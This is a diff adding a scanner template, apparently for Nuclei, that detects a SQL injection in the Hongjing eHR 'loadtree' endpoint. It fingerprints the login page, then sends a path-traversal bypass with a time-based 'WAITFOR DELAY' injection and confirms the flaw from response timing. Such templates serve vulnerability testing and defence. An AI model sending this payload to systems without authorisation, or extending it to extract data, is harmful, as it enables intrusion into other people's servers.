@@ -1,0 +1,48 @@
+id: poc-yaml-hongjing-ehr-loadtree-sqli
+info:
+  name: 宏景eHR loadtree SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: step-1
+    method: GET
+    path:
+      - "{{BaseURL}}/templates/index/hcmlogon.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/css/hcm/login.css"
+
+  - id: step-2
+    method: GET
+    path:
+      - "{{BaseURL}}/w_selfservice/oauthservlet/%2e./.%2e/common/org/loadtree?params=child&treetype=1&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{t1}}%27--&kind=2&issuperuser=1&manageprive=1&action=1&target=1&backdate=1&jump=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - "duration > t1 && duration < t2"
